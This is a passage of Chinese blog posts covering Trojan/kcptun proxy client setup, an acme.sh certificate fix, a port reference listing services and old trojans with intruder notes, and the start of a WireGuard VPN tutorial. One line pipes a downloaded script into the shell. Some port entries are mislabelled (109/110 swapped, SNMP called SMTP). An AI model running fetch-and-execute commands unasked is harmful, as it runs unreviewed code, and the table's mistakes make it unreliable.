src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210527193946025.png" alt="image-20210527193946025"></p><hr><h3 id="自动申请证书脚本"><a href="#自动申请证书脚本" class="headerlink" title="自动申请证书脚本"></a>自动申请证书脚本</h3><p>trojan2.sh脚本修复</p><p>其实报错日志已经提示了，第二行连用法都写出来了！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please update your account with an email address first.</span><br><span class="line">acme.sh --register-account -m my@example.com</span><br></pre></td></tr></table></figure><p>1.先果断重新安装acme，卸载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.acme.sh/acme.sh  --uninstall</span><br></pre></td></tr></table></figure><p>2.然后安装时别再忘记写邮箱了！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  https://get.acme.sh | sh -s email=my@example.com</span><br></pre></td></tr></table></figure><p>Cloudflare的最后再继续添加api密匙啥的环境变量等然后再申请。</p><p>另外有<a href="https://zhuanlan.zhihu.com/p/580318775">https://zhuanlan.zhihu.com/p/580318775</a> 详细参考</p><h2 id="关于封禁"><a href="#关于封禁" class="headerlink" title="关于封禁"></a>关于封禁</h2><p>trojan目前会封禁443端口，做内部iptables的端口转发到443或者换成kcp加速端口即可</p><h2 id="备用梯子"><a href="#备用梯子" class="headerlink" title="备用梯子"></a>备用梯子</h2><p>先有鸡还是先有蛋的问题</p><p>如何从0开始翻</p><ul><li>gitee上搜v2ray订阅源挨个测速找能用的</li><li>视频网站临时买个</li></ul><h2 id="自用一键脚本"><a href="#自用一键脚本" class="headerlink" title="自用一键脚本"></a>自用一键脚本</h2><p>Linux客户端一键脚本</p><p>看了网上零零散散各种自制脚本，还是自己写一个最方便了</p><p>脚本功能如下</p><ul><li>从oss/vps/国内可访问的云端链接，下载trojan-v1.16.0，下载kcptun-20240107到当前pwd目录</li><li>mkdir /etc/starvpn/trojan 和/etc/starvpn/kcptun一个starvpn文件夹和trojan，kcptun两个子文件夹</li><li>tar -xf trojan-1.16.0-linux-amd64-ubintu18-is-ok.tar.xz   /etc/starvpn/trojan</li><li>tar -xzvf kcptun-linux-amd64-20240107.tar.gz /etc/starvpn/kcptun</li><li>nohup ./trojan -c client.json -l ./trojan_error.log &amp;</li><li>nohup ./client_linux_amd64 -r “liloker.store:29902” -l “:11443” –key very_fast –crypt none -sndwnd 1024 -rcvwnd 2048 -mode fast3 –dscp 46 –log ./kcptun_client.log &amp;</li><li>使用以前开发的脚本添加开机自启服务./0x04_AddRCService.sh -n trojan_client -p /etc/starvpn/trojan/trojan -c ‘-c client.json -l ./trojan_error.log’</li><li>./0x04_AddRCService.sh -n kcptun_client -p /etc/starvpn/kcptun/client_linux_amd64 -c ‘-r “liloker.store:29902” -l “:11443” –key very_fast –crypt none -sndwnd 1024 -rcvwnd 2048 -mode fast3 –dscp 46 –log ./kcptun_client.log’</li></ul><hr><h2 id="常见与不常见端口汇总"><a href="#常见与不常见端口汇总" class="headerlink" title="常见与不常见端口汇总"></a>常见与不常见端口汇总</h2><p>一个计算机最多有65535个端口，端口不能重复。<br><strong>常用端口号：</strong><br>IIS（HTTP）：80<br>SQLServer：1433<br>Oracle：1521<br>MySQL：3306<br>FTP：21<br>SSH：22<br>Tomcat：8080</p><p><strong>常用和不常用端口一览</strong></p><p>端口：0<br>服务：Reserved<br>说明：通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用通常的闭合端口连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。 </p><p>端口：1<br>服务：tcpmux<br>说明：这显示有人在寻找SGI<br>Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如：IP、GUEST<br>UUCP、NUUCP、DEMOS<br>、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。</p><p>端口：7<br>服务：Echo<br>说明：能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。 </p><p>端口：19<br>服务：Character<br>Generator<br>说明：这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。同样Fraggle<br>DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。</p><p>端口：21<br>服务：FTP<br>说明：FTP服务器所开放的端口，用于上传、下载。最常见的攻击者用于寻找打开anonymous的FTP服务器的方法。这些服务器带有可读写的目录。木马Doly<br>Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade<br>Runner所开放的端口。</p><p>端口：22<br>服务：Ssh<br>说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。</p><p>端口：23<br>服务：Telnet<br>说明：远程登录，入侵者在搜索远程登录UNIX的服务。大多数情况下扫描这一端口是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny<br>Telnet<br>Server就开放这个端口。</p><p>端口：25<br>服务：SMTP<br>说明：SMTP服务器所开放的端口，用于发送邮件。入侵者寻找SMTP服务器是为了传递他们的SPAM。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL服务器上，将简单的信息传递到不同的地址。木马Antigen、Email<br>Password Sender、Haebu Coceda、Shtrilitz<br>Stealth、WinPC、WinSpy都开放这个端口。</p><p>端口：31<br>服务：MSG<br>Authentication<br>说明：木马Master Paradise、Hackers<br>Paradise开放此端口。</p><p>端口：42<br>服务：WINS<br>Replication<br>说明：WINS复制</p><p>端口：53<br>服务：Domain Name<br>Server（DNS）<br>说明：DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。</p><p>端口：67<br>服务：Bootstrap<br>Protocol Server<br>说明：通过DSL和Cable<br>modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68端口广播请求配置，服务器向67端口广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。</p><p>DHCP (UDP ports 67 and 68)</p><p>端口：69<br>服务：Trival<br>File<br>Transfer<br>说明：许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何文件。它们也可用于系统写入文件。 </p><p>端口：79<br>服务：Finger<br>Server<br>说明：入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。</p><p>端口：80<br>服务：HTTP<br>说明：用于网页浏览。木马Executor开放此端口。</p><p>端口：99<br>服务：Metagram<br>Relay<br>说明：后门程序ncx99开放此端口。</p><p>端口：102<br>服务：Message transfer<br>agent(MTA)-X.400 over TCP/IP<br>说明：消息传输代理。</p><p>端口：109<br>服务：Post Office<br>Protocol<br>-Version3<br>说明：POP3服务器开放此端口，用于接收邮件，客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。</p><p>端口：110<br>服务：SUN公司的RPC服务所有端口<br>说明：常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等</p><p>端口：113<br>服务：Authentication<br>Service<br>说明：这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多计算机的信息。但是它可作为许多服务的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，将会看到许多这个端口的连接请求。记住，如果阻断这个端口客户端会感觉到在防火墙另一边与E-MAIL服务器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。</p><p>端口：119<br>服务：Network<br>News Transfer<br>Protocol<br>说明：NEWS新闻组传输协议，承载USENET通信。这个端口的连接通常是人们在寻找USENET服务器。多数ISP限制，只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送SPAM。</p><p>端口：135<br>服务：Location<br>Service<br>说明：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX<br>111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point<br>mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point<br>mapper找到服务的位置。HACKER扫描计算机的这个端口是为了找到这个计算机上运行Exchange<br>Server吗？什么版本？还有些DOS攻击直接针对这个端口。</p><p>端口：137、138、139<br>服务：NETBIOS Name<br>Service<br>说明：其中137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS<br>Regisrtation也用它。 </p><p>端口：143<br>服务：Interim Mail Access Protocol<br>v2<br>说明：和POP3的安全问题一样，许多IMAP服务器存在有缓冲区溢出漏洞。记住：一种Linux蠕虫（admv0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一端口还被用于IMAP2，但并不流行。</p><p>端口：161<br>服务：SNMP<br>说明：SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p><p>端口：177<br>服务：X<br>Display Manager Control<br>Protocol<br>说明：许多入侵者通过它访问X-windows操作台，它同时需要打开6000端口。</p><p>端口：389<br>服务：LDAP、ILS<br>说明：轻型目录访问协议和NetMeeting<br>Internet Locator<br>Server共用这一端口。</p><p>端口：443<br>服务：Https<br>说明：网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。</p><p>端口：456<br>服务：[NULL]<br>说明：木马HACKERS<br>PARADISE开放此端口。</p><p>端口：513<br>服务：Login,remote login<br>说明：是从使用cable<br>modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。</p><p>端口：544<br>服务：[NULL]<br>说明：kerberos kshell</p><p>端口：548<br>服务：Macintosh,File<br>Services(AFP/IP)<br>说明：Macintosh,文件服务。</p><p>端口：553<br>服务：CORBA IIOP<br>（UDP）<br>说明：使用cable<br>modem、DSL或VLAN将会看到这个端口的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。</p><p>端口：555<br>服务：DSF<br>说明：木马PhAse1.0、Stealth<br>Spy、IniKiller开放此端口。</p><p>端口：568<br>服务：Membership DPA<br>说明：成员资格<br>DPA。</p><p>端口：569<br>服务：Membership MSN<br>说明：成员资格<br>MSN。</p><p>端口：635<br>服务：mountd<br>说明：Linux的mountd<br>Bug。这是扫描的一个流行BUG。大多数对这个端口的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个端口）。记住mountd可运行于任何端口（到底是哪个端口，需要在端口111做portmap查询），只是Linux默认端口是635，就像NFS通常运行于2049端口。</p><p>端口：636<br>服务：LDAP<br>说明：SSL（Secure<br>Sockets layer）</p><p>端口：666<br>服务：Doom Id Software<br>说明：木马Attack FTP、Satanz<br>Backdoor开放此端口</p><p>端口：993<br>服务：IMAP<br>说明：SSL（Secure Sockets<br>layer）</p><p>端口：1001、1011<br>服务：[NULL]<br>说明：木马Silencer、WebEx开放1001端口。木马Doly<br>Trojan开放1011端口。</p><p>端口：1024<br>服务：Reserved<br>说明：它是动态端口的开始，许多程序并不在乎用哪个端口连接网络，它们请求系统为它们分配下一个闲置端口。基于这一点分配从端口1024开始。这就是说第一个向系统发出请求的会分配到1024端口。你可以重启机器，打开Telnet，再打开一个窗口运行natstat<br>-a 将会看到Telnet被分配1024端口。还有SQL<br>session也用此端口和5000端口。</p><p>端口：1025、1033<br>服务：1025：network blackjack<br>1033：[NULL]<br>说明：木马netspy开放这2个端口。</p><p>端口：1080<br>服务：SOCKS<br>说明：这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于防火墙外部的攻击穿过防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。</p><p>端口：1170<br>服务：[NULL]<br>说明：木马Streaming<br>Audio Trojan、Psyber Stream<br>Server、Voice开放此端口。</p><p>端口：1234、1243、6711、6776<br>服务：[NULL]<br>说明：木马SubSeven2.0、Ultors<br>Trojan开放1234、6776端口。木马SubSeven1.0/1.9开放1243、6711、6776端口。</p><p>端口：1245<br>服务：[NULL]<br>说明：木马Vodoo开放此端口。</p><p>端口：1433<br>服务：SQL<br>说明：Microsoft的SQL服务开放的端口。</p><p>端口：1492<br>服务：stone-design-1<br>说明：木马FTP99CMP开放此端口。</p><p>端口：1500<br>服务：RPC<br>client fixed port session<br>queries<br>说明：RPC客户固定端口会话查询</p><p>端口：1503<br>服务：NetMeeting<br>T.120<br>说明：NetMeeting<br>T.120</p><p>端口：1524<br>服务：ingress<br>说明：许多攻击脚本将安装一个后门SHELL于这个端口，尤其是针对SUN系统中Sendmail和RPC服务漏洞的脚本。如果刚安装了防火墙就看到在这个端口上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个端口，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。</p><p>端口：1600<br>服务：issd<br>说明：木马Shivka-Burka开放此端口。</p><p>端口：1720<br>服务：NetMeeting<br>说明：NetMeeting<br>H.233 call Setup。</p><p>端口：1731<br>服务：NetMeeting Audio Call<br>Control<br>说明：NetMeeting音频调用控制。</p><p>端口：1807<br>服务：[NULL]<br>说明：木马SpySender开放此端口。</p><p>端口：1981<br>服务：[NULL]<br>说明：木马ShockRave开放此端口。</p><p>端口：1999<br>服务：cisco<br>identification<br>port<br>说明：木马BackDoor开放此端口。</p><p>端口：2000<br>服务：[NULL]<br>说明：木马GirlFriend<br>1.3、Millenium 1.0开放此端口。</p><p>端口：2001<br>服务：[NULL]<br>说明：木马Millenium 1.0、Trojan<br>Cow开放此端口。</p><p>端口：2023<br>服务：xinuexpansion 4<br>说明：木马Pass<br>Ripper开放此端口。</p><p>端口：2049<br>服务：NFS<br>说明：NFS程序常运行于这个端口。通常需要访问Portmapper查询这个服务运行于哪个端口。</p><p>端口：2115<br>服务：[NULL]<br>说明：木马Bugs开放此端口。</p><p>端口：2140、3150<br>服务：[NULL]<br>说明：木马Deep<br>Throat 1.0/3.0开放此端口。</p><p>端口：2500<br>服务：RPC client using a fixed port session<br>replication<br>说明：应用固定端口会话复制的RPC客户</p><p>端口：2583<br>服务：[NULL]<br>说明：木马Wincrash<br>2.0开放此端口。</p><p>端口：2801<br>服务：[NULL]<br>说明：木马Phineas<br>Phucker开放此端口。</p><p>端口：3024、4092<br>服务：[NULL]<br>说明：木马WinCrash开放此端口。</p><p>端口：3128<br>服务：squid<br>说明：这是squid<br>HTTP代理服务器的默认端口。攻击者扫描这个端口是为了搜寻一个代理服务器而匿名访问Internet。也会看到搜索其他代理服务器的端口8000、8001、8080、8888。扫描这个端口的另一个原因是用户正在进入聊天室。其他用户也会检验这个端口以确定用户的机器是否支持代理。</p><p>端口：3129<br>服务：[NULL]<br>说明：木马Master<br>Paradise开放此端口。</p><p>端口：3150<br>服务：[NULL]<br>说明：木马The<br>Invasor开放此端口。</p><p>端口：3210、4321<br>服务：[NULL]<br>说明：木马SchoolBus开放此端口</p><p>端口：3333<br>服务：dec-notes<br>说明：木马Prosiak开放此端口</p><p>端口：3389<br>服务：超级终端<br>说明：WINDOWS<br>2000终端开放此端口。</p><p>端口：3700<br>服务：[NULL]<br>说明：木马Portal of<br>Doom开放此端口</p><p>端口：3996、4060<br>服务：[NULL]<br>说明：木马RemoteAnything开放此端口</p><p>端口：4000<br>服务：QQ客户端<br>说明：腾讯QQ客户端开放此端口。</p><p>端口：4092<br>服务：[NULL]<br>说明：木马WinCrash开放此端口。</p><p>端口：4590<br>服务：[NULL]<br>说明：木马ICQTrojan开放此端口。</p><p>端口：5000、5001、5321、50505<br>服务：[NULL]<br>说明：木马blazer5开放5000端口。木马Sockets<br>de<br>Troie开放5000、5001、5321、50505端口。</p><p>端口：5400、5401、5402<br>服务：[NULL]<br>说明：木马Blade<br>Runner开放此端口。</p><p>端口：5550<br>服务：[NULL]<br>说明：木马xtcp开放此端口。</p><p>端口：5569<br>服务：[NULL]<br>说明：木马Robo-Hack开放此端口。</p><p>端口：5632<br>服务：pcAnywere<br>说明：有时会看到很多这个端口的扫描，这依赖于用户所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能的代理（这里的代理是指agent而不是proxy）。入侵者也会寻找开放这种服务的计算机。，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描包常含端口22的UDP数据包。</p><p>端口：5742<br>服务：[NULL]<br>说明：木马WinCrash1.03开放此端口。</p><p>端口：6267<br>服务：[NULL]<br>说明：木马广外女生开放此端口。</p><p>端口：6400<br>服务：[NULL]<br>说明：木马The<br>tHing开放此端口。</p><p>端口：6670、6671<br>服务：[NULL]<br>说明：木马Deep Throat开放6670端口。而Deep<br>Throat<br>3.0开放6671端口。</p><p>端口：6883<br>服务：[NULL]<br>说明：木马DeltaSource开放此端口。</p><p>端口：6969<br>服务：[NULL]<br>说明：木马Gatecrasher、Priority开放此端口。</p><p>端口：6970<br>服务：RealAudio<br>说明：RealAudio客户将从服务器的6970-7170的UDP端口接收音频数据流。这是由TCP-7070端口外向控制连接设置的。</p><p>端口：7000<br>服务：[NULL]<br>说明：木马Remote<br>Grab开放此端口。</p><p>端口：7300、7301、7306、7307、7308<br>服务：[NULL]<br>说明：木马NetMonitor开放此端口。另外NetSpy1.0也开放7306端口。</p><p>端口：7323<br>服务：[NULL]<br>说明：Sygate服务器端。</p><p>端口：7626<br>服务：[NULL]<br>说明：木马Giscier开放此端口。</p><p>端口：7789<br>服务：[NULL]<br>说明：木马ICKiller开放此端口。</p><p>端口：8000<br>服务：OICQ<br>说明：腾讯QQ服务器端开放此端口。</p><p>端口：8010<br>服务：Wingate<br>说明：Wingate代理开放此端口。</p><p>端口：8080<br>服务：代理端口<br>说明：WWW代理开放此端口。</p><p>端口：9400、9401、9402<br>服务：[NULL]<br>说明：木马Incommand<br>1.0开放此端口。</p><p>端口：9872、9873、9874、9875、10067、10167<br>服务：[NULL]<br>说明：木马Portal<br>of<br>Doom开放此端口。</p><p>端口：9989<br>服务：[NULL]<br>说明：木马iNi-Killer开放此端口。</p><p>端口：11000<br>服务：[NULL]<br>说明：木马SennaSpy开放此端口。</p><p>端口：11223<br>服务：[NULL]<br>说明：木马Progenic<br>trojan开放此端口。</p><p>端口：12076、61466<br>服务：[NULL]<br>说明：木马Telecommando开放此端口。</p><p>端口：12223<br>服务：[NULL]<br>说明：木马Hack’99<br>KeyLogger开放此端口。</p><p>端口：12345、12346<br>服务：[NULL]<br>说明：木马NetBus1.60/1.70、GabanBus开放此端口。</p><p>端口：12361<br>服务：[NULL]<br>说明：木马Whack-a-mole开放此端口。</p><p>端口：13223<br>服务：PowWow<br>说明：PowWow是Tribal<br>Voice的聊天程序。它允许用户在此端口打开私人聊天的连接。这一程序对于建立连接非常具有攻击性。它会驻扎在这个TCP端口等回应。造成类似心跳间隔的连接请求。如果一个拨号用户从另一个聊天者手中继承了IP地址就会发生好象有很多不同的人在测试这个端口的情况。这一协议使用OPNG作为其连接请求的前4个字节。</p><p>端口：16969<br>服务：[NULL]<br>说明：木马Priority开放此端口。</p><p>端口：17027<br>服务：Conducent<br>说明：这是一个外向连接。这是由于公司内部有人安装了带有Conducent”adbot”的共享软件。Conducent”adbot”是为共享软件显示广告服务的。使用这种服务的一种流行的软件是Pkware。</p><p>端口：19191<br>服务：[NULL]<br>说明：木马蓝色火焰开放此端口。</p><p>端口：20000、20001 </p><p>服务：[NULL]<br>说明：木马Millennium开放此端口。</p><p>端口：20034<br>服务：[NULL]<br>说明：木马NetBus<br>Pro开放此端口。</p><p>端口：21554<br>服务：[NULL]<br>说明：木马GirlFriend开放此端口。</p><p>端口：22222<br>服务：[NULL]<br>说明：木马Prosiak开放此端口。</p><p>端口：23456<br>服务：[NULL]<br>说明：木马Evil<br>FTP、Ugly<br>FTP开放此端口。</p><p>端口：26274、47262<br>服务：[NULL]<br>说明：木马Delta开放此端口。</p><p>端口：27374<br>服务：[NULL]<br>说明：木马Subseven<br>2.1开放此端口。</p><p>端口：30100<br>服务：[NULL]<br>说明：木马NetSphere开放此端口。</p><p>端口：30303<br>服务：[NULL]<br>说明：木马Socket23开放此端口。</p><p>端口：30999<br>服务：[NULL]<br>说明：木马Kuang开放此端口。</p><p>端口：31337、31338<br>服务：[NULL]<br>说明：木马BO(Back<br>Orifice)开放此端口。另外木马DeepBO也开放31338端口。</p><p>端口：31339 </p><p>服务：[NULL]<br>说明：木马NetSpy<br>DK开放此端口。</p><p>端口：31666<br>服务：[NULL]<br>说明：木马BOWhack开放此端口。</p><p>端口：33333<br>服务：[NULL]<br>说明：木马Prosiak开放此端口。</p><p>端口：34324<br>服务：[NULL]<br>说明：木马Tiny<br>Telnet Server、BigGluck、TN开放此端口。</p><p>端口：40412<br>服务：[NULL]<br>说明：木马The<br>Spy开放此端口。</p><p>端口：40421、40422、40423、40426、<br>服务：[NULL]<br>说明：木马Masters<br>Paradise开放此端口。</p><p>端口：43210、54321<br>服务：[NULL]<br>说明：木马SchoolBus<br>1.0/2.0开放此端口。</p><p>端口：44445<br>服务：[NULL]<br>说明：木马Happypig开放此端口。</p><p>端口：50766 </p><p>服务：[NULL]<br>说明：木马Fore开放此端口。</p><p>端口：53001<br>服务：[NULL]<br>说明：木马Remote<br>Windows Shutdown开放此端口。</p><p>端口：65000<br>服务：[NULL]<br>说明：木马Devil<br>1.03开放此端口。</p><p>端口：88<br>说明：Kerberos<br>krb5。另外TCP的88端口也是这个用途。</p><p>端口：137<br>说明：SQL Named Pipes encryption over other<br>protocols name lookup(其他协议名称查找上的SQL命名管道加密技术)和SQL RPC encryption over other<br>protocols name lookup(其他协议名称查找上的SQL RPC加密技术)和Wins NetBT name service(WINS<br>NetBT名称服务)和Wins Proxy都用这个端口。</p><p>端口：161<br>说明：Simple Network Management<br>Protocol(SMTP)（简单网络管理协议）。</p><p>端口：162<br>说明：SNMP<br>Trap（SNMP陷阱）</p><p>端口：445<br>说明：Common Internet File<br>System(CIFS)（公共Internet文件系统）</p><p>端口：464<br>说明：Kerberos<br>kpasswd(v5)。另外TCP的464端口也是这个用途。</p><p>端口：500<br>说明：Internet Key<br>Exchange(IKE)（Internet密钥交换）</p><p>端口：1645、1812<br>说明：Remot Authentication<br>Dial-In User Service(RADIUS)authentication(Routing and Remote<br>Access)(远程认证拨号用户服务)</p><p>端口：1646、1813<br>说明：RADIUS accounting(Routing and<br>Remote Access)(RADIUS记帐（路由和远程访问）)</p><p>端口：1701<br>说明：Layer Two Tunneling<br>Protocol(L2TP)(第2层隧道协议)</p><p>端口：1801、3527<br>说明：Microsoft Message Queue<br>Server(Microsoft消息队列服务器)。还有TCP的135、1801、2101、2103、2105也是同样的用途。</p><p>端口：2504<br>说明：Network<br>Load Balancing(网络平衡负荷)</p><p>网络层—数据包的包格式里面有个很重要的字段叫做协议号。比如在传输层如果是TCP连接，那么在网络层IP包里面的协议号就将会有个值是6，如果是UDP的话那个值就是17—传输层。</p><p>传输层—通过接口关联(端口的字段叫做端口)—应用层。<br>用netstat –an 可以查看本机开放的端口号。 </p><p><strong>代理服务器常用端口</strong></p><p>（1）. HTTP协议代理服务器常用端口号：80/8080/3128/8081/9080<br>（2）. SOCKS代理协议服务器常用端口号：1080<br>（3）. FTP（文件传输）协议代理服务器常用端口号：21<br>（4）. Telnet（远程登录）协议代理服务器常用端口：23</p><p>HTTP服务器，默认的端口号为80/tcp（木马Executor开放此端口）；<br>HTTPS（securely transferring web pages）服务器，默认的端口号为443/tcp 443/udp；<br>Telnet（不安全的文本传送），默认端口号为23/tcp（木马Tiny Telnet Server所开放的端口）；<br>FTP，默认的端口号为21/tcp（木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口）；<br>TFTP（Trivial File Transfer Protocol ），默认的端口号为69/udp；<br>SSH（安全登录）、SCP（文件传输）、端口重定向，默认的端口号为22/tcp；<br>SMTP Simple Mail Transfer Protocol (E-mail)，默认的端口号为25/tcp（木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口）；<br>POP3 Post Office Protocol (E-mail) ，默认的端口号为110/tcp；<br>WebLogic，默认的端口号为7001；<br>Webshpere应用程序，默认的端口号为9080；<br>webshpere管理工具，默认的端口号为9090；<br>JBOSS，默认的端口号为8080；<br>TOMCAT，默认的端口号为8080；<br>WIN2003远程登陆，默认的端口号为3389；<br>Symantec AV/Filter for MSE ,默认端口号为 8081；<br>Oracle 数据库，默认的端口号为1521；<br>ORACLE EMCTL，默认的端口号为1158；<br>Oracle XDB（ XML 数据库），默认的端口号为8080；<br>Oracle XDB FTP服务，默认的端口号为2100；<br>MS SQL<em>SERVER数据库server，默认的端口号为1433/tcp 1433/udp；<br>MS SQL</em>SERVER数据库monitor，默认的端口号为1434/tcp 1434/udp；<br>QQ，默认的端口号为1080/udp</p><p>TcpMux0 1 Tcp端口服务多路复用器<br>Echo 1 7 回送(echo回送所有的接收数据)</p><p>Discard2 9 删除(静态删除所有接受的数据)<br>Systat3 11 当前用户<br>Daytime 13 白天<br>Quotd 17 每天的引用<br>Chargen 19 产生字符<br>Ftp-data 20<br>文件传送(默认数据)<br>Ftp 21 文件传送(控制端口)<br>Telnet 23 远程通信网</p><p>Smtp 25 简单邮件传输协议<br>Time 37 时间<br>Nicname 43 谁</p><p>Domain 53 域名服务器<br>Bootps 67 引导程序协议服务器<br>Bootpc 68<br>引导程序协议客户<br>Tftp 69 普通文件传输协议<br>Gopher 70 Gopher</p><p>Finger 79 拨号<br>WWW-http 80 WWW-Http<br>Kerberos 88<br>Kerberos<br>Pop2 109 邮政协议版本2<br>Pop3 110 邮政协议版本3</p><p>Sunrpc 111 Sun运端程序呼叫<br>nntp 119 网络新闻传输协议<br>Ntp 123 网络时间协议</p><p>Netbios-ns 137 网络基本输入输出系统命名服务<br>Netbios-ns 138<br>网络基本输入输出系统数据报服务<br>Netbios-ssn 139 网络基本输入输出系统期间服务<br>Imap2 143<br>中间邮件访问协议V2<br>Snmp 161 简单网络管理协议<br>Bgp 179 边界网关协议</p><p>Syslog 514 系统登陆器</p>]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Trojan </tag>
            
            <tag> 端口 </tag>
            
            <tag> SOCKS5 </tag>
            
            <tag> VPS </tag>
            
            <tag> BBR加速 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0搭建企业专用网络VPN</title>
      <link href="2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E4%BB%8E0%E6%90%AD%E5%BB%BA%E4%BC%81%E4%B8%9A%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9Cvpn/"/>
      <url>2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E4%BB%8E0%E6%90%AD%E5%BB%BA%E4%BC%81%E4%B8%9A%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9Cvpn/</url>
      
        <content type="html"><![CDATA[<h1 id="基于linux内核wireguard模块从零实现企业vpn虚拟组网"><a href="#基于linux内核wireguard模块从零实现企业vpn虚拟组网" class="headerlink" title="基于linux内核wireguard模块从零实现企业vpn虚拟组网"></a>基于linux内核wireguard模块从零实现企业vpn虚拟组网</h1><h2 id="需求场景"><a href="#需求场景" class="headerlink" title="需求场景"></a>需求场景</h2><p>一个内网里有若干服务器，其中一台服务器具有公网ip，需要实现在家员工远程访问该内网内没有公网IP的服务器，需要安全方便且传输高效。</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>刚接到这个需求，发现直接以有公网IP的那台机器作为跳板机直接两次ssh连接或者整个端口流量转发似乎可行。</p><p>但人多，机器多，这会导致跳板机的开发成本较高，性能且不说，光ssh账号就得不少，管理起来不方便，端口转发的方案也不优雅。</p><p>一番调研之后，发现wireguard挺合适，理由如下：</p><ul><li><p>linux内核大于5.6（ubuntu22内核5.15正常是有的）的基本都自带该模块，内核级，性能优化这块没的说</p></li><li><p>用的是udp流量，对udp包加密，TCP流量是被包裹在UDP包里的，所以尽管udp不保证到达顺序，但内部的tcp还是可以负责可靠连接的。</p></li><li><p>WireGuard采用了多种加密方式来保护网络通信的安全性，其中包括以下几种：</p><ol><li>Noise协议：WireGuard使用Noise协议进行握手和密钥交换。Noise协议是一种轻量级的加密协议，可以在保证安全性的同时提供高效的性能。</li><li>Curve25519密钥交换算法：WireGuard使用Curve25519算法进行密钥交换。Curve25519是一种椭圆曲线算法，具有高度安全性和高效性能的优点。</li><li>ChaCha20加密算法：WireGuard使用ChaCha20算法进行数据加密。ChaCha20是一种流密码算法，可以快速地加密和解密数据。</li><li>Poly1305消息